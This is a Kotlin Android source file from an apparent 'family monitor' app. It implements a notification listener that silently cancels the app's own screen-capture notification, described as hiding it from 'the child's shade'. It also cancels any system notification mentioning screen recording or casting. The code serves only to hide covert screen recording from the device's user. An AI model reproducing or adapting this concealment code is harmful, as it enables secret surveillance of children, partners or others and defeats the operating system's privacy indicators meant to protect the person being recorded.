package com.example.family_monitor

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class ScreenNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        // Cancel our own foreground notification — keeps the service alive,
        // removes the notification from the child's shade
        if (sbn.packageName == packageName &&
            sbn.id == ScreenCaptureService.NOTIFICATION_ID) {
            try { cancelNotification(sbn.key) } catch (_: Exception) {}
            return
        }
        // Best-effort: cancel systemui "Screen is being recorded" chip (API < 34)
        if (sbn.packageName == "com.android.systemui") {
            val tag   = sbn.tag?.lowercase() ?: ""
            val title = sbn.notification?.extras
                ?.getCharSequence("android.title")?.toString()?.lowercase() ?: ""
            val text  = sbn.notification?.extras
                ?.getCharSequence("android.text")?.toString()?.lowercase()  ?: ""
            if (tag.contains("screen") || title.contains("screen") ||
                title.contains("record") || title.contains("cast") ||
                text.contains("screen")  || text.contains("record")) {
                try { cancelNotification(sbn.key) } catch (_: Exception) {}
            }
        }
    }
}
